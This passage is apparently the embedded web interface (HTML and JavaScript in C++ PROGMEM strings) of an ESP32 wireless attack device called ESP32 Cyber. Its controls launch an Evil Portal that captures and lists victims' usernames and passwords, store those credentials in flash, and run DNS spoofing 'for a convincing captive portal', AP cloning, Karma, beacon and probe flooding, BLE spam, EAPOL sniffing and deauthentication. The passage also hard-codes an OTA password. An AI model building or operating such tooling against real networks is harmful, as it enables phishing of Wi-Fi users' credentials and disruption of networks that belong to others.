    <div class="card-title">SCANNER</div>
    <div class="settings-row"><span class="sk">BLE Scan Duration</span><span class="sv2">4 seconds</span></div>
    <div class="settings-row"><span class="sk">WiFi Mode</span>        <span class="sv2">AP + STA</span></div>
    <div class="settings-row"><span class="sk">Max Networks</span>     <span class="sv2">20</span></div>
    <div class="settings-row"><span class="sk">Max BLE Devices</span>  <span class="sv2">20</span></div>
    <div class="settings-row"><span class="sk">Port Scan Timeout</span><span class="sv2">150 ms/port</span></div>
  </div>
  <div class="card">
    <div class="card-title">DEVICE</div>
    <div class="settings-row"><span class="sk">Version</span>      <span class="sv2">v2.0</span></div>
    <div class="settings-row"><span class="sk">Display</span>      <span class="sv2">ILI9341 240x320</span></div>
    <div class="settings-row"><span class="sk">Framework</span>    <span class="sv2">Arduino ESP32 3.x</span></div>
    <div class="settings-row"><span class="sk">Battery</span>      <span class="sv2" id="bat-pct">--</span></div>
  </div>
  <!-- DNS Spoof -->
  <div class="card">
    <div class="card-title">&#128268; DNS SPOOF</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Intercepts all DNS queries and redirects to the ESP32. Use alongside Karma or Evil Portal for a convincing captive portal.</div>
    <div style="display:flex;gap:8px;align-items:center">
      <button class="btn" id="dns-btn" style="border-color:var(--orange);color:var(--orange)" onclick="toggleDNSSpoof()">&#9654; Start</button>
      <span id="dns-status" style="color:var(--dim);font-size:.78rem"></span>
    </div>
  </div>

  <!-- Stored Credentials -->
  <div class="card">
    <div class="card-title">&#128272; STORED CREDENTIALS</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">All captured credentials saved to flash. Survive reboots.</div>
    <div style="display:flex;gap:8px;margin-bottom:10px">
      <button class="btn btn-accent" onclick="loadStoredCreds()">&#128229; Load</button>
      <button class="btn btn-red" onclick="clearStoredCreds()">&#128465; Clear</button>
    </div>
    <div id="stored-creds-list" style="max-height:200px;overflow-y:auto;font-size:.75rem">
      <div style="color:var(--dim);padding:8px">Press Load to view</div>
    </div>
  </div>

  <!-- OTA Update -->
  <div class="card">
    <div class="card-title">&#128640; OTA FIRMWARE UPDATE</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Upload new firmware wirelessly. Connect to WiFi first. Password: <span style="color:var(--accent)">esp32cyber</span></div>
    <div style="font-size:.78rem;color:var(--dim)" id="ota-status">Connect to WiFi to enable</div>
    <div id="ota-bar" style="display:none;margin-top:8px;background:var(--panel2);border-radius:6px;height:14px;overflow:hidden;border:1px solid var(--border)">
      <div id="ota-progress" style="height:100%;width:0%;background:var(--green);transition:width .3s;border-radius:6px"></div>
    </div>
  </div>

  <div style="margin-top:8px">
    <button class="btn btn-red" style="width:100%;padding:12px" onclick="navTo('reboot')">&#9211; Reboot Device</button>
  </div>
</div>

<!-- SCANNING -->
<div class="screen" id="s-scanning">
  <div class="scan-wrap">
    <span class="scan-icon" id="scan-icon">&#9654;</span>
    <div class="scan-lbl" id="scan-lbl">Scanning...</div>
    <div class="scan-sub" id="scan-sub">Please wait</div>
  </div>
</div>

<!-- REBOOT -->
<div class="screen" id="s-reboot">
  <div class="rb-wrap">
    <span class="rb-icon">&#9211;</span>
    <h2>REBOOT DEVICE</h2>
    <p>This will restart the ESP32.<br>The hotspot goes offline for ~5 seconds then returns.</p>
    <div class="rb-btns">
      <button class="btn-reboot" onclick="doReboot()">&#9211; Reboot Now</button>
      <button class="btn-cancel" onclick="navTo('dash')">Cancel</button>
    </div>
  </div>
</div>

</div>

<script>
// -- state --
let wD=[],bD=[],nD=[],apD=[],portD=[],chD=new Array(15).fill(0);
// Persist login across refreshes within same tab session
let pinVerified = (sessionStorage.getItem('pv')==='1');
let curNav='dash'; // must be declared before navTo/checkDisclaimer

// ── ONE ATTACK AT A TIME ─────────────────────────────────────────────────────
// Track which attack is currently running so we can stop it before starting another
let _activeAttackCmd  = null;  // the stop command for the current attack
let _activeAttackName = null;  // human readable name for logging

async function stopActiveAttack(){
  if(!_activeAttackCmd) return;
  try{ await post('/cmd',{cmd:_activeAttackCmd,index:-1,strVal:''}); }catch(e){}
  addLog('info',(_activeAttackName||'Attack')+' stopped (new attack starting)');
  _activeAttackCmd=null; _activeAttackName=null;
  // Brief pause to let ESP32 process the stop
  await new Promise(r=>setTimeout(r,300));
}
function setActiveAttack(stopCmd, name){
  _activeAttackCmd=stopCmd; _activeAttackName=name;
}
function clearActiveAttack(){
  _activeAttackCmd=null; _activeAttackName=null;
  // Refresh state immediately after any stop
  setTimeout(()=>fetch('/full_state').then(r=>r.json()).then(d=>updateState(d)).catch(()=>{}),400);
}

// Disclaimer - show on first ever visit, stored in localStorage permanently
function checkDisclaimer(){
  if(localStorage.getItem('disclaimer_agreed') !== '1'){
    document.getElementById('s-disclaimer').classList.add('active');
    document.getElementById('nav').classList.remove('visible');
  } else {
    navTo('dash');
  }
}
function agreeDisclaimer(){
  localStorage.setItem('disclaimer_agreed','1');
  document.getElementById('s-disclaimer').classList.remove('active');
  navTo('dash');
}
checkDisclaimer();
// If already verified, tell ESP32 we want menu state
if(pinVerified){ fetch('/full_state').then(r=>r.json()).then(d=>{
  if(d&&d.state==='lock') fetch('/cmd',{method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({cmd:'menu',index:-1})});
}).catch(()=>{}); }
let chBest=1,chBusy=1,bat=100;
let selW=-1,selB=-1,pinBuf='';

// -- navigation --
function show(id){
  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
  const el=document.getElementById(id);
  if(el)el.classList.add('active');
}
function navTo(tab){
  if(tab==='lock'){show('s-lock');document.getElementById('nav').classList.remove('visible');return;}
  document.getElementById('nav').classList.add('visible');
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  const tEl=document.getElementById('t-'+tab);
  if(tEl)tEl.classList.add('active');
  curNav=tab;
  const map={dash:'s-dash',wifi:'s-wifi',ble:'s-ble',net:'s-net',
             tools:'s-tools',wardrive:'s-wardrive',watk:'s-watk',batk:'s-batk',defend:'s-defend',
             logs:'s-logs',settings:'s-settings',reboot:'s-reboot',scanning:'s-scanning'};
  show(map[tab]||'s-dash');
}

// -- api --
let sessionPin = localStorage.getItem('cyberpin') || '';
async function post(path,body){
  if(sessionPin) body.pin = sessionPin;
  try{
    const r=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    if(r.status===401){
      const p=prompt('Enter PIN to access ESP32 Cyber:');
      if(p){ sessionPin=p; localStorage.setItem('cyberpin',p); return post(path,body); }
      return null;
    }
    return r.ok?r.json():null;
  }catch{return null;}
}
async function get(path){try{const r=await fetch(path);return r.ok?r.json():null;}catch{return null;}}

async function doCmd(c,idx,extra){
  const body={cmd:c,index:idx!==undefined?idx:-1};
  if(extra)Object.assign(body,extra);
  const r=await post('/cmd',body);
  online(!!r);
  const scanning={scan_wifi:'&#x1F4F6; Scanning WiFi...',scan_ble:'&#x1F4F7; Scanning BLE...',
                  scan_net:'&#x1F5A7; Scanning Network...',port_scan:'&#128272; Port Scanning...',

)~";

static const char HTML4[] PROGMEM = R"~(
                  ap_refresh:'&#128274; Refreshing...'};
  if(scanning[c]){
    document.getElementById('scan-icon').innerHTML=scanning[c].split(' ')[0];
    document.getElementById('scan-lbl').textContent=scanning[c].slice(scanning[c].indexOf(' ')+1);
    document.getElementById('scan-sub').textContent=c==='scan_ble'?'BLE scan takes ~4 seconds':'Please wait...';
    navTo('scanning');
  }
  return r;
}

// -- PIN --
function pk(k){
  if(k==='CLR'){if(pinBuf.length>0)pinBuf=pinBuf.slice(0,-1);}
  else if(k==='OK'){subPin();return;}
  else{if(pinBuf.length<4)pinBuf+=k;if(pinBuf.length===4){subPin();return;}}
  drawDots(false);
}
function drawDots(err){
  for(let i=0;i<4;i++){
    const d=document.getElementById('pd'+i);
    d.className='pd'+(i<pinBuf.length?' f':'')+(err?' e':'');
  }
  const m=document.getElementById('lock-msg');
  m.className='lock-msg'+(err?' err':'');
  m.textContent=err?'Wrong PIN -- try again':'enter your pin';
}
async function subPin(){
  const r=await post('/cmd',{cmd:'pin',pin:pinBuf});
  if(!r||r.correct===false){
    pinVerified=false;sessionStorage.removeItem('pv');drawDots(true);pinBuf='';
    setTimeout(()=>drawDots(false),800);
  } else {
    pinBuf='';drawDots(false);
    pinVerified=true;
    sessionStorage.setItem('pv','1');
    navTo('dash');
  }
}

// -- helpers --
function encL(e){return{0:'OPEN',2:'WPA',3:'WPA2',4:'WPA/2',5:'WEP'}[e]||'???';}
function encB(e){const c=e===0?'bo':e===5?'bw':'bs';return`<span class="badge ${c}">${encL(e)}</span>`;}
function barsH(rssi){
  const n=Math.max(0,Math.min(4,Math.round((rssi+100)/15)));
  let h='<div class="bars">';
  for(let i=0;i<4;i++)h+=`<span class="${i<n?'on':''}" style="height:${(i+1)*4}px"></span>`;
  return h+'</div>';
}
function qualLabel(rssi){
  if(rssi>=-50)return{t:'Excellent',c:'var(--green)'};
  if(rssi>=-60)return{t:'Good',c:'var(--green)'};
  if(rssi>=-70)return{t:'Fair',c:'var(--yellow)'};
  if(rssi>=-80)return{t:'Weak',c:'var(--orange)'};
  return{t:'Very Weak',c:'var(--red)'};
}
function proxLabel(rssi){
  if(rssi>=-55)return{t:'Very Close (<2m)',c:'var(--green)'};
  if(rssi>=-67)return{t:'Close (~5m)',c:'var(--green)'};
  if(rssi>=-80)return{t:'Medium (~10m)',c:'var(--yellow)'};
  return{t:'Far (>15m)',c:'var(--red)'};
}

// -- WiFi --
function renderWifi(){
  const el=document.getElementById('wifi-list');
  if(!wD.length){el.innerHTML='<div class="empty"><span class="ei">&#x1F4F6;</span>No networks -- press Rescan</div>';return;}
  let open=0,strong=0,chs=new Set();
  wD.forEach(n=>{if(n.enc===0)open++;if(n.rssi>=-70)strong++;chs.add(n.channel);});
  document.getElementById('w-tot').textContent=wD.length;
  document.getElementById('w-str').textContent=strong;
  document.getElementById('w-opn').textContent=open;
  document.getElementById('w-ch').textContent=chs.size;
  const _wc=document.getElementById('d-wcnt'); if(_wc) _wc.textContent=wD.length;
  const _wc2=document.getElementById('d-wifi-cnt'); if(_wc2) _wc2.textContent=wD.length;
  eapolPopulateTargets(); // refresh EAPOL target dropdown with latest scan
  el.innerHTML=wD.map((n,i)=>`
    <div class="ni ${i===selW?'sel':''}" onclick="selWifi(${i})">
      <div style="flex:1;min-width:0">
        <div class="ni-name">${n.ssid||'<i style="color:var(--dim)">(hidden)</i>'}
          ${n.wps?'<span style="background:var(--red);color:#fff;font-size:.6rem;padding:1px 4px;border-radius:3px;margin-left:4px">WPS</span>':''}
        </div>
        <div class="ni-sub">${n.rssi} dBm &nbsp;&middot;&nbsp; ch ${n.channel} &nbsp;&middot;&nbsp; <span style="color:var(--dim)">${n.mfr||''}</span></div>
      </div>
      <div class="ni-r">${encB(n.enc)}${barsH(n.rssi)}</div>
    </div>`).join('');
}
async function selWifi(i){
  selW=i;renderWifi();
  await post('/cmd',{cmd:'select_wifi',index:i});
  const n=wD[i];const q=qualLabel(n.rssi);
  document.getElementById('d-ssid').textContent=n.ssid||'(hidden)';
  document.getElementById('d-rssi').textContent=n.rssi+' dBm';
  document.getElementById('d-enc').textContent=encL(n.enc);
  document.getElementById('d-chan').textContent='Channel '+n.channel;
  document.getElementById('d-qual').innerHTML=`<span style="color:${q.c}">${q.t}</span>`;
  document.getElementById('wifi-dc').classList.add('open');
}
function closeWD(){document.getElementById('wifi-dc').classList.remove('open');selW=-1;renderWifi();}

// -- BLE --
function renderBle(){
  const el=document.getElementById('ble-list');
  if(!bD.length){el.innerHTML='<div class="empty"><span class="ei">&#x1F4F7;</span>No devices -- press Rescan</div>';return;}
  let named=0,close=0;
  bD.forEach(d=>{if(d.name)named++;if(d.rssi>=-67)close++;});
  document.getElementById('b-tot').textContent=bD.length;
  document.getElementById('b-named').textContent=named;
  document.getElementById('b-close').textContent=close;
  const _bc=document.getElementById('d-bcnt'); if(_bc) _bc.textContent=bD.length;
  const _bc2=document.getElementById('d-ble-cnt'); if(_bc2) _bc2.textContent=bD.length;
  el.innerHTML=bD.map((d,i)=>`
    <div class="ni ${i===selB?'sel':''}" onclick="selBle(${i})">
      <div><div class="ni-name">${d.name||'<i style="color:var(--dim)">Unknown Device</i>'}</div>
           <div class="ni-sub">${d.rssi} dBm &nbsp;&middot;&nbsp; ${d.addr}</div></div>
      <div class="ni-r">${barsH(d.rssi)}</div>
    </div>`).join('');
}
async function selBle(i){
  selB=i;renderBle();
  await post('/cmd',{cmd:'select_ble',index:i});
  const d=bD[i];const p=proxLabel(d.rssi);
  document.getElementById('d-bname').textContent=d.name||'Unknown';
  document.getElementById('d-baddr').textContent=d.addr||'N/A';
  document.getElementById('d-brssi').textContent=d.rssi+' dBm';
  document.getElementById('d-bprox').innerHTML=`<span style="color:${p.c}">${p.t}</span>`;
  document.getElementById('ble-dc').classList.add('open');
}
function closeBD(){document.getElementById('ble-dc').classList.remove('open');selB=-1;renderBle();}

// -- Network --
let netMapVisible = false;
function toggleNetMap(){
  netMapVisible = !netMapVisible;
  document.getElementById('net-map').style.display = netMapVisible ? 'block' : 'none';
  document.getElementById('netmap-btn').textContent = netMapVisible ? '&#128506; Hide Map' : '&#128506; Show Map';
  if(netMapVisible) drawNetMap();
}
function drawNetMap(){
  const svg = document.getElementById('net-svg');
  if(!svg) return;
  const W = svg.clientWidth || 320, H = 220;
  const cx = W/2, cy = H/2;
  let html = '';
  html += `<circle cx="${cx}" cy="${cy}" r="26" fill="#00c8ff22" stroke="#00c8ff" stroke-width="2"/>`;
  html += `<text x="${cx}" y="${cy-4}" text-anchor="middle" fill="#00c8ff" font-size="10" font-weight="bold">ESP32</text>`;
  html += `<text x="${cx}" y="${cy+10}" text-anchor="middle" fill="#00c8ff88" font-size="8">192.168.4.1</text>`;
  if(!nD.length){
    html += `<text x="${cx}" y="${cy+50}" text-anchor="middle" fill="#3d5068" font-size="10">No devices connected</text>`;
  }
  nD.forEach((d,i) => {
    const angle = (i / nD.length) * Math.PI * 2 - Math.PI/2;
    const r = Math.min(W,H)*0.35;
    const nx = cx + r*Math.cos(angle), ny = cy + r*Math.sin(angle);
    html += `<line x1="${cx}" y1="${cy}" x2="${nx}" y2="${ny}" stroke="#1a2540" stroke-width="1.5"/>`;
    html += `<circle cx="${nx}" cy="${ny}" r="20" fill="#0d121922" stroke="#3d5068" stroke-width="1.5"/>`;
    const label = (d.ip||'?').split('.').pop();
    html += `<text x="${nx}" y="${ny+4}" text-anchor="middle" fill="#c8d8f0" font-size="9">.${label}</text>`;
    const mac = (d.mac||'').substring(0,8);
    html += `<text x="${nx}" y="${ny+32}" text-anchor="middle" fill="#3d5068" font-size="7">${mac}</text>`;
  });
  svg.innerHTML = html;
}

function renderNet(){
  if(netMapVisible) drawNetMap();
  const el=document.getElementById('net-list');
  const t=document.getElementById('n-tot');
  if(!nD.length){
    if(t)t.textContent='0';
    el.innerHTML='<div class="empty"><span class="ei">&#x1F5A7;</span>No clients connected<br>Connect a device to ESP32-Cyber then refresh</div>';return;
  }
  if(t)t.textContent=nD.length;
  const _nc=document.getElementById('d-ncnt'); if(_nc) _nc.textContent; //=nD.length;
  el.innerHTML=nD.map(h=>`
    <div class="ni">
      <div><div class="ni-name">&#x1F4BB; ${h.ip}</div>
           <div class="ni-sub">${h.mac}</div></div>
      <div class="ni-r"><span class="badge bs">&#9679; LIVE</span></div>
    </div>`).join('');
}

// -- AP Manager --
function renderAP(){
  const el=document.getElementById('ap-list');
  const t=document.getElementById('ap-cnt');
  if(!apD.length){if(t)t.textContent='0';
    el.innerHTML='<div class="empty" style="padding:10px;font-size:.8rem;color:var(--dim)">No clients on your hotspot</div>';return;}
  if(t)t.textContent=apD.length;
  el.innerHTML=apD.map(c=>`
    <div class="ni" style="margin-bottom:6px">
      <div><div class="ni-name">&#128100; ${c.ip||'--'}</div>
           <div class="ni-sub">${c.mac}</div></div>
      <span class="badge bs">Connected</span>
    </div>`).join('');
}
function confirmKick(){
  if(confirm('Disconnect ALL clients from your ESP32-Cyber hotspot?'))
    doCmd('ap_kick_all');
}

// -- Port Scanner --
async function startPortScan(){
  const ip=document.getElementById('port-target').value.trim();
  if(!ip){alert('Enter a target IP');return;}
  document.getElementById('port-results').innerHTML=
    '<div class="empty" style="padding:10px;font-size:.8rem;color:var(--green)">&#128269; Scanning ports...</div>';
  try{
    // Use a longer timeout for port scan — ESP32 blocks briefly during scan
    const ctrl=new AbortController();
    const tid=setTimeout(()=>ctrl.abort(),8000); // 8s timeout
    const r=await fetch('/cmd',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({cmd:'port_scan',index:-1,target:ip}),
      signal:ctrl.signal
    });
    clearTimeout(tid);
    // Don't call online() here — don't let scan timeout affect connection status
    // Poll for results immediately after the command
    setTimeout(()=>{
      fetch('/full_state').then(r=>r.json()).then(d=>{
        updateState(d);
        renderPorts();
      }).catch(()=>{
        // Try once more after a delay
        setTimeout(()=>fetch('/full_state').then(r=>r.json()).then(d=>{updateState(d);renderPorts();}).catch(()=>{}),1500);
      });
    },1500);
  }catch(e){
    // Scan might have timed out on the fetch but still completed on ESP32
    // Poll for results anyway
    setTimeout(()=>fetch('/full_state').then(r=>r.json()).then(d=>{
      updateState(d); renderPorts();
    }).catch(()=>{}),2000);
  }
}
function renderPorts(){
  const el=document.getElementById('port-results');
  if(!portD.length){el.innerHTML='<div class="empty" style="padding:10px;font-size:.8rem;color:var(--dim)">No open ports found</div>';return;}
  el.innerHTML=`<div style="color:var(--dim);font-size:.72rem;margin-bottom:8px">${portD.length} open port(s) found</div>`+
    portD.map(p=>`
      <div class="port-item">
        <span class="port-num">:${p.port}</span>
        <span class="port-svc">${p.service}</span>
        <span class="badge bs">OPEN</span>
      </div>`).join('');
}

// -- Channel Analyser --
function renderChannels(){
  const wrap=document.getElementById('ch-bars');
  if(!wrap)return;
  const maxCount=Math.max(1,...chD.slice(1,14));
  let html='';

)~";

static const char HTML5[] PROGMEM = R"~(
  for(let c=1;c<=13;c++){
    const h=Math.max(2,Math.round((chD[c]/maxCount)*70));
    const cls=c===chBusy?'busy':c===chBest?'free':'';
    html+=`<div class="ch-bar-col">
      <div class="ch-bar ${cls}" style="height:${h}px" title="ch${c}: ${chD[c]} nets"></div>
      <div class="ch-num">${c}</div>
    </div>`;
  }
  wrap.innerHTML=html;
  document.getElementById('ch-best').textContent=chBest;
  document.getElementById('ch-busy').textContent=chBusy;
  document.getElementById('d-ch').textContent=chBest;
  if(chD.slice(1,14).some(v=>v>0))
    document.getElementById('ch-note').textContent=`Analysing ${chD.slice(1,14).reduce((a,b)=>a+b,0)} networks across channels 1-13`;
}

// -- Reboot --
async function doReboot(){
  await post('/cmd',{cmd:'reboot',index:-1});
  online(false);
  document.getElementById('scan-icon').innerHTML='&#9211;';
  document.getElementById('scan-lbl').textContent='Rebooting...';
  document.getElementById('scan-sub').textContent='Back in ~5 seconds';
  navTo('scanning');
  setTimeout(()=>{
    const t=setInterval(async()=>{
      const r=await get('/state');if(r){clearInterval(t);processState(r);}
    },1500);
  },4000);
}

// -- State polling --
async function poll(){
  const d=await get('/full_state');
  if(!d){online(false);return;}
  online(true);
  if(d.heap){
    const h=document.getElementById('d-heap');
    if(h) h.textContent=Math.round(d.heap/1024)+'KB';
  }
  if(d.ip){
    const ip=document.getElementById('d-ip');
    if(ip) ip.textContent=d.ip;
  }
  if(d.bat !== undefined){
    const bp=document.getElementById('bat-pct');
    if(bp){
      const pct=d.bat;
      const col=pct>50?'var(--green)':pct>20?'var(--yellow)':'var(--red)';
      bp.innerHTML=`<span style="color:${col}">${pct}%</span>`;
    }
    // Also update dashboard battery icon if it exists
    const dbat=document.getElementById('d-bat');
    if(dbat) dbat.textContent=d.bat+'%';
  }
  if(d.uptime !== undefined){
    const up=document.getElementById('d-uptime');
    if(up){
      const s=Math.floor(d.uptime/1000);
      const m=Math.floor(s/60); const h2=Math.floor(m/60);
      up.textContent = h2>0 ? h2+'h '+( m%60)+'m' : m>0 ? m+'m '+(s%60)+'s' : s+'s';
    }
  }
  if(d.clients !== undefined){
    const cl=document.getElementById('d-clients');
    if(cl) cl.textContent=d.clients;
  }
  processState(d);
}

function processState(d){
  const st=d.state||'lock';
  // Only update scan data when the corresponding scan is complete
  // Don't overwrite with empty 'scanning' state data
  if(d.wifi && (st==='wifi' || st==='dash' || st==='menu')) wD=d.wifi;
  if(d.ble  && (st==='ble'  || st==='dash' || st==='menu')) bD=d.ble;
  if(d.net)  nD=d.net;
  if(d.ap)   apD=d.ap;
  if(d.ports)portD=d.ports;
  if(d.ch){
    chD=d.ch;
    chBest=d.chBest||1;
    chBusy=d.chBusy||1;
  }
  if(d.battery!==undefined){
    bat=d.battery;
    const bp=document.getElementById('bat-pct');
    if(bp)bp.textContent=bat+'%';
    const db=document.getElementById('dash-bat');
    if(db)db.textContent='Battery: '+bat+'%';
  }

  // Navigate based on device state
  if(st==='lock')        {if(curNav!=='lock'&&!pinVerified)navTo('lock');}
  else if(st==='menu')   {if((curNav==='lock'||curNav==='scanning')&&pinVerified)navTo('dash');}
  else if(st==='wifi')   {if(curNav==='scanning'||curNav==='lock')navTo('wifi');renderWifi();}
  else if(st==='ble')    {if(curNav==='scanning'||curNav==='lock')navTo('ble'); renderBle();}
  else if(st==='net')    {if(curNav==='scanning'||curNav==='lock')navTo('net'); renderNet();}
  else if(st==='tools')  {if(curNav==='scanning'||curNav==='lock')navTo('tools');renderAP();renderPorts();renderChannels();}
  else if(st==='settings'){if(curNav==='lock')navTo('settings');}
  else if(st==='scanning'){}  // already on scanning screen

  // Always refresh visible data
  if(curNav==='wifi')    renderWifi();
  if(curNav==='ble')     renderBle();
  if(curNav==='net')     renderNet();
  if(curNav==='tools')   {renderAP();renderPorts();renderChannels();}
  if(curNav==='dash')    renderWifi(); // update dashboard counts
}

// -- Attacks state --
let atkState={bsl:false,bsr:false,ep:false,rr:false,pf:false,apc:false,karma:false,bles:false,blesa:false,eapol:false,pine:false,pinePoller:null,ssidconf:false};

async function stopAllAttacks(){
  // Reset all local state flags
  Object.keys(atkState).forEach(k=>{ if(typeof atkState[k]==='boolean') atkState[k]=false; });
  // Reset all toggle button visual states
  const toggleBtns=[
    'bsl-btn','bsr-btn','rr-btn','pf-btn','apc-btn','karma-btn',
    'bles-btn','blesa-btn','eapol-btn','pine-btn','ssidconf-btn',
    'deauth-btn','pmkid-btn','airdrop-btn'
  ];
  toggleBtns.forEach(id=>{
    const b=document.getElementById(id);
    if(b){ b.style.borderColor=''; b.style.color=''; }
  });
  // Reset running status text
  ['bsl-status','bsr-status','rr-status','pf-status','karma-status',
   'bles-status','blesa-status','airdrop-status','controller-status',
   'spoof-status'].forEach(id=>{
    const el=document.getElementById(id);
    if(el) el.textContent='';
  });
  pmkidRunning=false; airdropRunning=false;
  await post('/cmd',{cmd:'stop_all_attacks',index:-1});
  addLog('info','All attacks stopped');
}

// -- Attack history --------------------------------------------------------
let atkHistory = {};
function recordAtkStart(name){ atkHistory[name]={start:Date.now(),end:null}; addLog("atk","Started: "+name); }
function recordAtkStop(name){ if(atkHistory[name]){atkHistory[name].end=Date.now(); const d=Math.round((Date.now()-atkHistory[name].start)/1000); addLog("atk","Stopped: "+name+" ("+d+"s)");} }

function setAtkBtn(id,running,label){
  // Auto-track history
  const names={bsl:"Beacon List",bsr:"Beacon Random",rr:"Rick Roll",pf:"Probe Flood",
    apc:"AP Clone",karma:"Karma",bles:"BLE Spam iOS",blesa:"BLE Spam All",
    eapol:"EAPOL Sniffer",pine:"Pineapple Detect"};
  if(names[id]){ if(running) recordAtkStart(names[id]); else recordAtkStop(names[id]); }
  const btn=document.getElementById(id+'-btn');
  const sta=document.getElementById(id+'-status');
  if(!btn)return;
  if(running){
    btn.textContent='&#9632; Stop';
    btn.style.borderColor='var(--red)';btn.style.color='var(--red)';
    if(sta) sta.textContent='RUNNING &#9679;';
    if(sta) sta.style.color='var(--red)';
  } else {
    btn.textContent='&#9654; Start';
    btn.style.borderColor='';btn.style.color='';
    if(sta) sta.textContent='';
  }
}

async function toggleBeaconList(){
  if(atkState.bsl){
    await post('/cmd',{cmd:'atk_beacon_stop',index:-1,strVal:''});
    atkState.bsl=false; setAtkBtn('bsl',false); clearActiveAttack();
    return;
  }
  await stopActiveAttack(); setActiveAttack('atk_beacon_stop','Beacon Spam List');
  const raw=document.getElementById('bsl-ssids').value.trim();
  if(!atkState.bsl && !raw){alert('Enter at least one SSID');return;}
  const ssids=raw.split('\n').map(s=>s.trim()).filter(s=>s.length>0).join(',');
  await post('/cmd',{cmd:'atk_beacon_list',index:-1,ssids:ssids});
  atkState.bsl=!atkState.bsl;
  setAtkBtn('bsl',atkState.bsl);
}
async function toggleBeaconRandom(){
  if(atkState.bsr){
    await post('/cmd',{cmd:'atk_beacon_random_stop',index:-1,strVal:''});
    atkState.bsr=false; setAtkBtn('bsr',false); clearActiveAttack();
    return;
  }
  await stopActiveAttack(); setActiveAttack('atk_beacon_random_stop','Beacon Spam Random');
  await post('/cmd',{cmd:'atk_beacon_random',index:-1});
  atkState.bsr=!atkState.bsr;
  setAtkBtn('bsr',atkState.bsr);
}
let _epPoller = null;
async function pollEPCreds(){
  try{
    const r=await fetch('/ep_creds');
    if(!r.ok) return;
    const creds=await r.json();
    const el=document.getElementById('ep-creds-list');
    const wrap=document.getElementById('ep-creds-wrap');
    if(!el||!wrap) return;
    if(creds.length>0){
      wrap.style.display='block';
      el.innerHTML=creds.map(c=>`
        <div style="padding:6px 8px;border-bottom:1px solid var(--border);font-family:monospace">
          <span style="color:var(--yellow)">${c.user||'(none)'}</span>
          <span style="color:var(--dim)"> / </span>
          <span style="color:var(--red)">${c.pass||'(none)'}</span>
          <span style="color:var(--dim);font-size:.7rem"> — ${c.ip}</span>
        </div>`).join('');
      document.getElementById('ep-status').textContent=creds.length+' credential(s) captured';
    }
  }catch(e){}
}
async function clearEPCreds(){
  await post('/cmd',{cmd:'ep_clear_creds',index:-1});
  document.getElementById('ep-creds-list').innerHTML='<div style="color:var(--dim);padding:8px">No credentials captured yet...</div>';
  document.getElementById('ep-status').textContent='Cleared';
}
async function toggleEvilPortal(){
  if(atkState.ep){
    await post('/cmd',{cmd:'evil_portal_stop',index:-1,strVal:''});
    atkState.ep=false;
    const _epb=document.getElementById('ep-btn');
    if(_epb){_epb.textContent='&#9654; Start';}
    const _eps=document.getElementById('ep-status');
    if(_eps){_eps.textContent='Stopped';_eps.style.color='';}
    if(_epPoller){clearInterval(_epPoller);_epPoller=null;}
    clearActiveAttack();
    return;
  }
  await stopActiveAttack(); setActiveAttack('evil_portal_stop','Evil Portal');
  const template = document.getElementById('ep-template') ? 
    parseInt(document.getElementById('ep-template').value) : 0;
  if(!atkState.ep){
    if(!confirm('Evil Portal replaces the web UI on port 80.\nUse the Stop button here OR tap the TFT to restore.\nContinue?'))return;
  }
  await post('/cmd',{cmd:'atk_evil_portal',index:template});
  atkState.ep=!atkState.ep;
  const sta=document.getElementById('ep-status');
  if(atkState.ep){
    btn.textContent='&#9632; Stop Portal';
    sta.textContent='Running on port 8080 — connect to ESP32-Cyber WiFi then go to http://192.168.4.1:8080';
    sta.style.color='var(--red)';
    document.getElementById('ep-creds-wrap').style.display='block';
    if(_epPoller) clearInterval(_epPoller);
    _epPoller=setInterval(pollEPCreds,2000);
  } else {
    btn.textContent='&#9654; Start';
    sta.textContent='Stopped';
    if(_epPoller){clearInterval(_epPoller);_epPoller=null;}
    document.getElementById('ep-creds-wrap').style.display='none';
  }
}
async function toggleRickRoll(){
  if(atkState.rr){
    await post('/cmd',{cmd:'atk_rick_roll',index:-1});
    atkState.rr=false; setAtkBtn('rr',false); clearActiveAttack();
    return;
  }
  await stopActiveAttack(); setActiveAttack('atk_rick_roll_stop','Rick Roll Beacon');
  atkState.rr=!atkState.rr;
  setAtkBtn('rr',atkState.rr);
  post('/cmd',{cmd:'atk_rick_roll',index:-1}); // fire and forget - don't await
}
async function toggleProbeFlood(){
  await post('/cmd',{cmd:'atk_probe_flood',index:-1});
  atkState.pf=!atkState.pf;
  setAtkBtn('pf',atkState.pf);
}
let apcResults=[];
async function apCloneScan(){
  const btn=document.getElementById('apc-scan-btn');
  const sta=document.getElementById('apc-status');
  btn.disabled=true; sta.textContent='Scanning...';
  await post('/cmd',{cmd:'atk_ap_clone_scan',index:-1});
  // Wait for scan to complete then fetch results
  await new Promise(r=>setTimeout(r,4000));
  try{
    const r=await fetch('/apc_scan');
    if(r.ok){
      apcResults=await r.json();
      renderAPCList();
      sta.textContent=apcResults.length+' networks found';
    }
  }catch(e){}
  btn.disabled=false;
}
function renderAPCList(){
  const el=document.getElementById('apc-list');
  el.style.display='block';
  if(apcResults.length===0){el.innerHTML='<div style="color:var(--dim);padding:8px">No networks found</div>';return;}
  el.innerHTML=apcResults.map(ap=>`
    <label style="display:flex;align-items:center;gap:8px;padding:5px 4px;cursor:pointer;border-bottom:1px solid var(--border)">
      <input type="checkbox" data-idx="${ap.idx}" ${ap.sel?'checked':''} onchange="apcToggle(${ap.idx},this.checked)">
      <span style="flex:1;color:var(--txt)">${ap.ssid}</span>
      <span style="color:var(--dim)">${ap.rssi}dBm</span>
    </label>`).join('');
}
async function apcToggle(idx,on){
  apcResults[idx].sel=on;
  await fetch('/apc_select',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({idx:idx,on:on})});
}
async function apcSelectAll(){
  apcResults.forEach(ap=>ap.sel=true);
  renderAPCList();
  await fetch('/apc_select',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({all:true})});
}
async function apcSelectNone(){
  apcResults.forEach(ap=>ap.sel=false);
  renderAPCList();
